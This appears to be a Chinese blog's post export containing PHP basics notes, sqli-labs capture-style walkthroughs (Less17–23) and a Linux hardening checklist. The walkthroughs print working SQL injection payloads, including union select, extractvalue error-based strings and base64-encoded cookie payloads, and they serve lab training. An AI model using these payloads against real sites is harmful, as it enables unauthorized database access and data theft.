<td>从左向右</td>
<td>&lt;&lt;、&gt;&gt;</td>
<td>位运算符</td>
</tr>
<tr>
<td>9</td>
<td>无结合</td>
<td>&lt;、&lt;=、&gt;、&gt;=</td>
<td>比较运算符</td>
</tr>
<tr>
<td>10</td>
<td>无结合</td>
<td>==、!=、===、!==、&lt;&gt;、&lt;=&gt;</td>
<td>比较运算符</td>
</tr>
<tr>
<td>11</td>
<td>从左向右</td>
<td>&amp;</td>
<td>位运算符和引用</td>
</tr>
<tr>
<td>12</td>
<td>从左向右</td>
<td>^</td>
<td>位运算符</td>
</tr>
<tr>
<td>13</td>
<td>从左向右</td>
<td>&#124;</td>
<td>位运算符</td>
</tr>
<tr>
<td>14</td>
<td>从左向右</td>
<td>&amp;&amp;</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>15</td>
<td>从左向右</td>
<td>&#124;&#124;</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>16</td>
<td>从右向左</td>
<td>??</td>
<td>null 合并运算符</td>
</tr>
<tr>
<td>17</td>
<td>从左向右</td>
<td>? :</td>
<td>三元运算符</td>
</tr>
<tr>
<td>18</td>
<td>从右向左</td>
<td>=、+=、-=、*=、**=、/=、.=、%=、&amp;=、&#124;=、^=、&lt;&lt;=、&gt;&gt;=</td>
<td>赋值运算符</td>
</tr>
<tr>
<td>19</td>
<td>从左向右</td>
<td>and</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>20</td>
<td>从左向右</td>
<td>xor</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>21</td>
<td>从左向右</td>
<td>or</td>
<td>逻辑运算符</td>
</tr>
</tbody></table>
<h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><ol>
<li>表达式是 <code>PHP</code> 最重要的基石。在 <code>PHP</code> 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是<strong>任何有值的东西</strong>。</li>
<li>最基本的表达式形式是常量和变量。当键入<code>$a = 5</code>。</li>
<li>稍微复杂的表达式例子就是函数。 </li>
<li>其他还有运算符与操作数构成的也成表达式。如：比较表达式<code>$a&gt;5</code>、<code>$a==5</code>。 </li>
</ol>
<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>有时候使用可变变量名是很方便的。就是说，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; &#39;hello&#39;;			&#x2F;&#x2F;普通变量</span><br><span class="line">$$a &#x3D; &#39;world&#39;;			&#x2F;&#x2F;可变变量</span><br><span class="line">echo &quot;$a $&#123;$a&#125;&quot;;		&#x2F;&#x2F;输出：hello world</span><br><span class="line">echo &quot;$a $hello&quot;;		&#x2F;&#x2F;输出：hello world</span><br></pre></td></tr></table></figure>
<h2 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h2><ol>
<li>引用操作符<code>&amp;</code>可以在关联赋值中使用，就像一个别名，使得变量都指向了内存的相同地址。</li>
<li>通过<code>unset($a)</code>重置变量与内存的关联<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;5;</span><br><span class="line">$b&#x3D;&amp;$a;</span><br><span class="line">echo $b;	&#x2F;&#x2F;输出5</span><br><span class="line">$a&#x3D;7;</span><br><span class="line">echo $b;	&#x2F;&#x2F;输出7</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less23（过滤了注释符的绕过）</title>
    <url>/posts/13aa761f.html</url>
    <content><![CDATA[<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>本关对<code>id</code>参数过滤了<code>#</code>和<code>--</code>的处理。但是还可以使用闭合的方式来注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;3</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102009.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less20、21、22(cookie注入)</title>
    <url>/posts/eb6bd74b.html</url>
    <content><![CDATA[<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>从源代码中我们可以看到 <code>cookie</code> 从 <code>username</code> 中获得值后，当再次刷新时，会从 <code>cookie</code> 中读<br>取 <code>username</code>，然后进行查询。<br>登录成功后，我们修改 <code>cookie</code>，再次刷新时，这时候 <code>sql</code> 语句就会被修改了</p>
<p>先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改<code>cookie</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102006.png" alt="image"></p>
<h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>与Less20处理流程一样，但是对cookie进行了<code>base64</code>加密。利用Less20的方法，但是需要将<code>payload</code>进行<code>base64</code>编码处理（这里对uname进行了<code>(&#39;uname&#39;)</code>处理）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102007.png" alt="image"></p>
<h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>本关和Less20、Less21是一致的，但是<code>uname</code>进行了<code>&quot;uname&quot;</code>的处理<br>构造<code>payload</code>:<code>admin&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></p>
<p><code>payload</code>进行<code>base64</code>编码后，修改<code>cookie</code>再进行提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102008.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-19(referer注入)</title>
    <url>/posts/588aed09.html</url>
    <content><![CDATA[<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>本关和Less18基本是一致的，只不过是<code>referer</code>处存在注入</p>
<p>使用burp抓包修改<code>referer</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020102005.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-18(useragent注入)</title>
    <url>/posts/e9f63d2e.html</url>
    <content><![CDATA[<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>本关可以从源码了解到对<code>uname</code>和<code>passwd</code>进行了<code>check_input()</code>函数的处理，所以这里无法注入了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure>
<p>但是代码中将<code>useragent</code>和<code>ip</code>插入到数据库中，可以使用<code>useragent</code>进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br></pre></td></tr></table></figure>
<p>使用burp抓包修改<code>useragent</code>看看</p>
<p><img src="https://qiniu.hzktester.top/tp2020102003.png" alt="image"></p>
<p>修改<code>useragent</code>报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102004.png" alt="image"></p>
<p>可以看到已经得到版本号了</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-17(update注入)</title>
    <url>/posts/cb3a4153.html</url>
    <content><![CDATA[<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关可以看到是一个修改密码的过程，利用的是<code>update</code>语句，与再用<code>select</code>时是一样的。</p>
<p>尝试报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p>可以看到<code>sql</code>语句报错</p>
<p><img src="https://qiniu.hzktester.top/tp2020102001.png" alt="image"></p>
<p>尝试一下报错注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102002.png" alt="image"></p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>linux操作系统加固</title>
    <url>/posts/61d5f45a.html</url>
    <content><![CDATA[<h1 id="Linux系统基本操作"><a href="#Linux系统基本操作" class="headerlink" title="Linux系统基本操作"></a>Linux系统基本操作</h1><h2 id="文件结构图及关键文件功能"><a href="#文件结构图及关键文件功能" class="headerlink" title="文件结构图及关键文件功能"></a>文件结构图及关键文件功能</h2><h3 id="Linux文件结构"><a href="#Linux文件结构" class="headerlink" title="Linux文件结构"></a>Linux文件结构</h3><p><img src="https://qiniu.hzktester.top/tp2020101501.png" alt="image"></p>
<h3 id="Linux文件结构图"><a href="#Linux文件结构图" class="headerlink" title="Linux文件结构图"></a>Linux文件结构图</h3><p><img src="https://qiniu.hzktester.top/tp2020101502.png" alt="image"></p>
<h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><table>
<thead>
<tr>
<th>目录</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>/bin</td>
<td>放置的是在单人维护模式下能够被操作的指令，在/bin底下的指令可以被root与 一般账号所使用</td>
</tr>
<tr>
<td>/boot</td>
<td>这个目录只要在放置开机会使用到的文件，包括Linux核心文件以及开机选单与 开机所需配置的文件等等</td>
</tr>
<tr>
<td>/dev</td>
<td>在Linux系统上，任何装置与接口设备都是以文件的形态存在于这个目录当中的</td>
</tr>
<tr>
<td>/etc</td>
<td>系统主要的配置文件几乎都放置在这个目录内，例如人员的账号密码文件，各 种服务的启动档，系统变量配置等</td>
</tr>
<tr>
<td>/home</td>
<td>这是系统默认的用户家目录(homedirectory)</td>
</tr>
<tr>
<td>/lib</td>
<td>/lib放置的则是在开机时会用到的函式库，以及在/lib或/sbin底下的指令会呼叫 的函式库</td>
</tr>
<tr>
<td>/media</td>
<td>/media底下放置的是可移出的装置，包括软盘、光盘、DVD等等装置都杂事挂载与此</td>
</tr>
<tr>
<td>/opt</td>
<td>给第三方协议软件放置的目录</td>
</tr>
<tr>
<td>/root</td>
<td>系统管理员（root）的家目录</td>
</tr>
<tr>
<td>/sbin</td>
<td>放置/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所 需要的指令。</td>
</tr>
<tr>
<td>/srv</td>
<td>srv可视为[service]的缩写，是一些网络服务启动之后，这些服务所需要取用的 数据目录</td>
</tr>
<tr>
<td>/tmp</td>
<td>这是让一般使用者或者是正在执行的程序暂时放置文件的地方</td>
</tr>
</tbody></table>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><table>
<thead>
<tr>
<th>目录</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>/etc/passwd</td>
<td>记录系统本地用户的属性信息，如UId,Gid,家目录等信息</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>存放用户的口令等信息，只有系统管理员用户能查看</td>
</tr>
<tr>
<td>/etc/pam.d/system-auth</td>
<td>账户安全配置文件</td>
</tr>
<tr>
<td>/etc/login.defs</td>
<td>设置用户账户限制的配置文件，对root用户无效</td>
</tr>
<tr>
<td>/etc/securetty</td>
<td>网络配置文件</td>
</tr>
<tr>
<td>/etc/pam.d/su</td>
<td>su命令配置</td>
</tr>
<tr>
<td>/etc/hosts.allow、/etc/hosts.deny</td>
<td>允许/拒接某网段远程连接到主机</td>
</tr>
<tr>
<td>/etc/profile</td>
<td>保存Linux全局环境变量信息，如umask,bash历史命令设置</td>
</tr>
</tbody></table>
<h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h3 id="账号分类："><a href="#账号分类：" class="headerlink" title="账号分类："></a>账号分类：</h3><p>超级管理员  uid=0</p>
<p>系统默认用户    系统程序使用，从不登录</p>
<p>新建普通用户    uid大于500</p>
<p><img src="https://qiniu.hzktester.top/tp2020101503.png" alt="image"></p>
<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><img src="https://qiniu.hzktester.top/tp2020101504.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：密码字符串或占位符x</span><br><span class="line">字段3：用户账号的UID号</span><br><span class="line">字段4：所属基本组的GID号</span><br><span class="line">字段5：用户全名</span><br><span class="line">字段6：宿主目录</span><br><span class="line">字段7：登录shell程序的路径</span><br></pre></td></tr></table></figure>

<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><img src="https://qiniu.hzktester.top/tp2020101505.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;shadow</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：加密后的密码字符串</span><br><span class="line">子段3：上次修改密码的时间</span><br><span class="line">字段4：密码的最短有效天数，默认0</span><br><span class="line">字段5：密码的最长有效天数，默认99999</span><br><span class="line">字段6：密码过期前的警告天数，默认7</span><br><span class="line">字段7：密码过期后多少天禁用此用户账号</span><br><span class="line">字段8：账号失效时间，默认值为空</span><br><span class="line">字段9：保留字段（未使用）</span><br></pre></td></tr></table></figure>

<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test        &#x2F;&#x2F;添加用户test</span><br><span class="line">passwd test         &#x2F;&#x2F;为test用户设置密码</span><br><span class="line">passwd -l test      &#x2F;&#x2F;锁定用户test</span><br><span class="line">passwd -u test      &#x2F;&#x2F;解锁用户test</span><br><span class="line">userdel -r test    &#x2F;&#x2F;删除用户test</span><br><span class="line">id                  &#x2F;&#x2F;查看当前用户</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101506.png" alt="image"></p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="查看权限：ls-l"><a href="#查看权限：ls-l" class="headerlink" title="查看权限：ls -l"></a>查看权限：<code>ls -l</code></h3><p>下图中文件所有者(属主)为root，所有组(属组)为root，文件名为<code>install.log</code>,权限为的第一个减号“-”代表的是文件类型：</p>
<p>-：普通文件，d:目录文件，l:链接文件，b:设备文件，c:字符设备文件，p:管道文件<br><img src="https://qiniu.hzktester.top/tp2020101507.png" alt="image"></p>
<p>读(read)，写(write)，执行r(recute)简写即为(r,w,x),亦可用数字来(4,2,1)表示</p>
<p><img src="https://qiniu.hzktester.top/tp2020101508.png" alt="image"></p>
<h3 id="修改权限：chown"><a href="#修改权限：chown" class="headerlink" title="修改权限：chown"></a>修改权限：<code>chown</code></h3><p>chown命令是用于更改文件的用户和组的所有权。要将文件 foo 的用户和组的所有权更改为 root，可以使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）chown root:root foo</span><br><span class="line">2）chown root: foo</span><br></pre></td></tr></table></figure>
<p>在用户名后跟冒号【: 】运行该命令将同时设置用户和组所有权。</p>
<p>要仅将文件 foo 的用户所有权设置为 root 用户，操作命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown root foo</span><br></pre></td></tr></table></figure>
<p>要仅更改文件 foo 的组所有权，则需要在组之前加冒号，操作命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown :root foo</span><br></pre></td></tr></table></figure>
<h3 id="初始文件权限：UMASK"><a href="#初始文件权限：UMASK" class="headerlink" title="初始文件权限：UMASK"></a>初始文件权限：<code>UMASK</code></h3><p>这篇文章写的很详细，可以参考一下</p>
<p><a href="https://www.cnblogs.com/wang-shishuang/p/10458875.html">https://www.cnblogs.com/wang-shishuang/p/10458875.html</a></p>
<h1 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h1><h2 id="锁定系统中多余的自建账号"><a href="#锁定系统中多余的自建账号" class="headerlink" title="锁定系统中多余的自建账号"></a>锁定系统中多余的自建账号</h2><p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<blockquote>
<p>查看账户、口令文件，与系统管理员确认不必要的账号。对于一些保留的系统伪帐户如：bin,sys,adm,uucp,lp,nuucp,hpdb,www,daemon等可根据需要锁定登陆。</p>
</blockquote>
<p>加固方法：</p>
<p>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的账号。</p>
<p>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账号。</p>
<h2 id="检查shadow中空口令账号"><a href="#检查shadow中空口令账号" class="headerlink" title="检查shadow中空口令账号"></a>检查shadow中空口令账号</h2><p>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F: &#39;length($2)&#x3D;&#x3D;0 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101509.png" alt="image"></p>
<p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的账户。<br>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账户。<br>使用命令<code>passwd &lt;用户名&gt;</code>为用户设置密码。</p>
<h2 id="设置系统密码策略"><a href="#设置系统密码策略" class="headerlink" title="设置系统密码策略"></a>设置系统密码策略</h2><p>执行命令（查看密码策略设置）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;login.defs|grep PASS</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101510.png" alt="image"></p>
<p>加固方法（修改配置文件）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;login.defs</span><br><span class="line"></span><br><span class="line">PASS_MAX_DAYS   90  &#x2F;&#x2F;用户的密码最长使用天数</span><br><span class="line">PASS_MIN_DAYS   0   &#x2F;&#x2F;两次修改密码的最小时间间隔</span><br><span class="line">PASS_MIN_LEN    7   &#x2F;&#x2F;密码的最小长度</span><br><span class="line">PASS_WARN_AGE   9   &#x2F;&#x2F;密码过期前多少天开始提示</span><br></pre></td></tr></table></figure>

<h2 id="禁用root之外的超级用户"><a href="#禁用root之外的超级用户" class="headerlink" title="禁用root之外的超级用户"></a>禁用root之外的超级用户</h2><p>检测方法（检查id为0的用户）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F &quot;:&quot; &#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101511.png" alt="image"></p>
<p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定用户</p>
<h2 id="限制能够su为root的用户"><a href="#限制能够su为root的用户" class="headerlink" title="限制能够su为root的用户"></a>限制能够su为root的用户</h2><p>使用命令<code>cat /etc/pam.d/su</code>查看是否有<code>auth required /lib/security/pam_wheel.so</code>这样的配置条目</p>
<p>加固方法：（在头部添加）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth required &#x2F;lib&#x2F;security&#x2F;pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure>
<p>这样，只有wheel组的用户可以su到root</p>
<p><img src="https://qiniu.hzktester.top/tp2020101512.png" alt="image"></p>
<h2 id="重要文件加上不可改变属性"><a href="#重要文件加上不可改变属性" class="headerlink" title="重要文件加上不可改变属性"></a>重要文件加上不可改变属性</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chattr +i &#x2F;etc&#x2F;passwd</span><br><span class="line">chattr +i &#x2F;etc&#x2F;shadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;gshadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;group</span><br><span class="line">chattr +i &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">chattr +i &#x2F;etc&#x2F;httpd.conf</span><br></pre></td></tr></table></figure>

<h2 id="Umask安全"><a href="#Umask安全" class="headerlink" title="Umask安全"></a>Umask安全</h2><p><img src="https://qiniu.hzktester.top/tp2020101513.png" alt="image"></p>
<blockquote>
<p>第一个0代表suid 丢弃的权限；<br>第二个0代表本文件/目录拥有者什么权限都没丢弃<br>第三个2代表本文件/目录的用户组丢弃了w权限<br>第四个2代表本文件/目录的其他用户能使用的权限只有有r和x</p>
</blockquote>
<p>实际权限=<strong>7777-0022</strong>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umask 0022</span><br></pre></td></tr></table></figure>
<h2 id="ssh安全"><a href="#ssh安全" class="headerlink" title="ssh安全"></a>ssh安全</h2><p>禁止root用户进行远程登录<br>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep PermitRootLogin是否为no</span><br></pre></td></tr></table></figure>
<p>加固方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure>
<p>更改服务端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">Port 2222   &#x2F;&#x2F;更改ssh端口</span><br></pre></td></tr></table></figure>

<h2 id="屏蔽SSH登录banner信息"><a href="#屏蔽SSH登录banner信息" class="headerlink" title="屏蔽SSH登录banner信息"></a>屏蔽SSH登录banner信息</h2><p>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep banner</span><br><span class="line">&#x2F;&#x2F;查看文件中是否存在banner字段，或banner字段为NONE</span><br><span class="line">cat &#x2F;etc&#x2F;motd</span><br><span class="line">查看文件内容，该处内容作为banner信息显示给登录用户</span><br></pre></td></tr></table></figure>
<p>加固方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
<p>添加<code>banner NONE</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;motd</span><br></pre></td></tr></table></figure>
<p>删除全部内容或更新成自己想要添加的内容</p>
<p><img src="https://qiniu.hzktester.top/tp2020101514.png" alt="image"></p>
<h2 id="仅允许SSH协议版本2"><a href="#仅允许SSH协议版本2" class="headerlink" title="仅允许SSH协议版本2"></a>仅允许SSH协议版本2</h2><blockquote>
<p>有两个SSH协议版本，仅使用SSH协议版本2会更安全，SSH协议版本1有安全问题，包括中间人攻击<br>（man-in-the-middle）和注入（insertion）攻击。</p>
</blockquote>
<p>编辑<code>/etc/ssh/sshd_config</code>文件并查找下面这样的行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Protocol 2,1</span><br><span class="line">修改为</span><br><span class="line">Protocol 2</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101515.png" alt="image"></p>
<h2 id="防止误使用Ctrl-Alt-Del重启系统"><a href="#防止误使用Ctrl-Alt-Del重启系统" class="headerlink" title="防止误使用Ctrl+Alt+Del重启系统"></a>防止误使用Ctrl+Alt+Del重启系统</h2><p>检查方法（查看输出行是否被注释）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inittab |grep ctrl-alt-del</span><br><span class="line">Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure>
<p>加固方法（在行开否添加注释符号“#”）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;inittab</span><br><span class="line"># Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101516.png" alt="image"></p>
<h2 id="设置账户锁定登录失败锁定次数、锁定时间"><a href="#设置账户锁定登录失败锁定次数、锁定时间" class="headerlink" title="设置账户锁定登录失败锁定次数、锁定时间"></a>设置账户锁定登录失败锁定次数、锁定时间</h2><p>检查方法（查看有无<code>auth required pam_tally2.so</code>条目的设置）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;pam.d&#x2F;system-auth|grep auth </span><br></pre></td></tr></table></figure>
<p>加固方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pam.d&#x2F;system-auth</span><br><span class="line"></span><br><span class="line">auth required pam_tally2.so onerr&#x3D;fail deny&#x3D;3 unlock_time&#x3D;30 even_deny_root root_unlock_time&#x3D;100</span><br></pre></td></tr></table></figure>
<p>设置为密码连续错误3次锁定，锁定时间30秒。root密码连续错误3次锁定，时间为 100秒<br><img src="https://qiniu.hzktester.top/tp2020101517.png" alt="image"></p>
<h2 id="修改账户TMOUT值，设置自动注销时间"><a href="#修改账户TMOUT值，设置自动注销时间" class="headerlink" title="修改账户TMOUT值，设置自动注销时间"></a>修改账户TMOUT值，设置自动注销时间</h2><p>检查方法（查看有无TMOUT的设置）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile|grep TMOUT </span><br></pre></td></tr></table></figure>
<p>加固方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">TMOUT&#x3D;600  &#x2F;&#x2F;增加条目。无操作600秒后自动退出</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101518.png" alt="image"></p>
<h2 id="设置BASH保留历史命令的条目"><a href="#设置BASH保留历史命令的条目" class="headerlink" title="设置BASH保留历史命令的条目"></a>设置BASH保留历史命令的条目</h2><p>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile | grep HISTSIZE</span><br></pre></td></tr></table></figure>
<p>加固方法（修改HISTSIZE=5即保留最新执行的5条命令<br>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101519.png" alt="image"></p>
<h2 id="用户注销时删除命令记录"><a href="#用户注销时删除命令记录" class="headerlink" title="用户注销时删除命令记录"></a>用户注销时删除命令记录</h2><p>检查方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br></pre></td></tr></table></figure>
<p>增加如下行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br><span class="line">rm -f $HOME&#x2F;.bash_history</span><br></pre></td></tr></table></figure>
<p>这样，系统中的所有用户注销时都会删除其命令记录，如果只需要针对某个特定用户，如root用户进行设置，则可只在该用户的主目录下修改<code>/$HOME/.bash_history</code>文件增加相同的一行即可。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101520.png" alt="image"></p>
